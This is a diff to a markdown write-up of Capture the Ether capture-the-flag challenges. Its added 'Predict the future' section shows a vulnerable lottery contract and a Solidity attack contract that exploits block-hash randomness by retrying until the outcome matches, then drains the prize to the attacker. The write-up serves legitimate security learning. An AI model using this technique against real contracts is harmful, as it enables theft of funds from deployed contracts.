@@ -1,7 +1,9 @@
-# Capture The Ether
+# Capture The Ether WRITEUP
 
 
-# WRITEUP
+Writeup of the different challenges of [Capture the ether](https://capturetheether.com/)
+
+# Warmup
 
 ## 2) Call Me
 
@@ -13,6 +15,8 @@ Again the challenge is simple, you call the function `setNickame()` with your ni
 2 subtilities:
 - One, you need to call `setNickname()` on the CaptureTheEther contract at address `0x71c46Ed333C35e4E6c62D32dc7C8F00D125b4fee` and not the address given on the left.
 - Two, you need to be sure to encode your nickname correctly. The contract check the leftmost character to see if its 0 or not so you need to be sure that your nickname is save as 0xYOURNICKNAMEINHEX00000000000000000000...0 instead of 0x00000000000000000000...0YOURNICKNAMEINHEX.
+
+# Lotteries
 
 ## 4) Guess the number
 
@@ -64,3 +68,52 @@ Then our `attack()` function call the `guess()` function with a `msg.value` of `
 ```solidity
 receive() external payable {}
 ```
+
+
+## 6) Predict the future
+
+We need to guess a number between 0 and 9 (because of the `% 10`) and call `lockInGuess(uint8 n)`. Then with a different transaction, check wheter our guess was correct or not by calling `settle()`. The problem is, if the guess was wrong, we need to guess again and each guess cost us 1 ether:
+```solidity
+function lockInGuess(uint8 n) public payable {
+    require(guesser == 0);
+    require(msg.value == 1 ether); // need to pay 1 ether to guess
+
+    guesser = msg.sender;
+    guess = n;
+    settlementBlockNumber = block.number + 1; 
+}
+
+function settle() public {
+    require(msg.sender == guesser); // need to call lockInGuess() each time we settle
+    require(block.number > settlementBlockNumber);// has to be a different transaction (and in a different block)
+
+    uint8 answer = uint8(
+        keccak256(block.blockhash(block.number - 1), now)
+    ) % 10; // calculate the answer
+
+    guesser = 0; //reset, so if the next line is wrong, we need to call lockInGuess() again
+    if (guess == answer) {
+        msg.sender.transfer(2 ether);
+    }
+}
+```
+The trick is to randomly guess a number, say 8, and then with a different transaction check whether that transaction will be in a block where the answer will be equal to our guess. If it is, we call `settle()` and win, if it's not, we simply abort the transaction, lost some gas fee, and try again.
+```solidity
+function attack() public returns (bool) {
+    uint8 answer = uint8(
+        uint256(
+            keccak256(
+                abi.encodePacked(
+                    blockhash(block.number - 1),
+                    block.timestamp
+                )
+            )
+        )
+    ) % 10; // compute the answer just like the target contract will, with the same params (`block.number` and `block.timestamp`)
+    require(answer == 8); // make sure our answer is correct, if not revert
+    PredictTheFutureChallenge(target).settle(); // if its correct, we call settle()
+    payable(msg.sender).transfer(address(this).balance);// and transfer our ether from our contract to our attacker address
+}
+```
+Now we just need to send the same transaction where we call `attack()` until the tx goes through and we recover our ethers. We only lose some gas fee.
+
